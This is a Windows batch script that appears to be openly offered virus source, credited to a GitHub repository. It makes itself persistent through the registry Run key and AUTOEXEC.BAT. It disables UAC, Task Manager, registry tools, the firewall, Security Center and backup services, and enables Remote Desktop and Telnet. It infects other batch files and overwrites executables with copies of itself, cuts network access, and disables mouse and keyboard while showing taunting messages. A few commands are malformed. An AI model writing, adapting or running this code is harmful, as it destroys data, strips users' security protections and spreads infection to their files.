:: Thanks: https://github.com/bdunlap9/Batch/blob/master/virus.bat

@echo off
setlocal enableextensions disabledelayedexpansion

copy "virus.bat" "C:\Users\Public"
delete "virus.bat"
start virus C:\Users\Public\virus.bat

reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "virus.bat" /t REG_SZ /F /D "C:\Users\Public"
if "%1" equ "Restarted" goto %1

set dll1=run
set dll2=dll32
set m=mouse
set k=keyboard

@Cmd /k Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t "REG_DWORD" /d "0" /f
goto InstallServices

:again
echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
goto :again

:Restarted
echo Don't bother restarting pc is registered to startup and regedit is disabled!

:loop
echo Give up! You cannot close me!
timeout /T 1 > NUL 
goto loop

:InfectFilesOnSystem
echo orgy > infect1.bat
echo if [%%1]==[infect1.bat] goto DontBother > infect2.bat
echo if [%%1]==[infect2.bat] goto DontBother >> infect2.bat
echo copy %%1 + infect1.bat %%1 >> infect2.bat
echo attrib +r %%1 >> infect2.bat
echo :DontBother >> infect2.bat
attrib +r infect1.bat
attrib +r infect2.bat
for %%f in (*.bat) do call infect2 %%f
attrib -r infect1.bat
attrib -r infect2.bat
del infect1.bat
del infect2.bat

assoc .exe=batfile
DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy /y %0 "%%j:%%k"

goto PayLoad

:InstallServices
REM Enabling & Disabling Services by Registry
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_SZ /d 1 /f

If Exist "%systemdrive%\AUTOEXEC.BAT" (
copy %0 "%systemroot%\toaDyxpB.bat"
echo start "" "%systemroot%\toaDyxpB.bat" >> %systemdrive%\AUTOEXEC.BAT
)

net stop"MpsSvc"
taskkill /f /t /im"FirewallControlPanel.exe"
if %errorlevel%==1 tskill FirewallControlPanel
netsh firewall set opmode mode=disable

dism /online /Enable-Feature /FeatureName:TelnetClient
goto InfectFilesOnSystem

:PayLoad
REM Change Time
time 00:00

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /t Reg_dword /v DisableRegistryTools /f /d 1

net stop "WSearch"
net stop "Security Center"
net stop "SDRSVC"

ipconfig /release + vbnewlineif %ERRORLEVEL%==1 ipconfig /release_all

echo MSGBOX "GUESS WHAT? WHAT? YOU'RE FUCKED MATE!" > %temp%\TEMPmessage.vbs
call %temp%\TEMPmessage.vbs

%dll1%%dll2% %m%,disable
%dll1%%dll2% %k%,disable
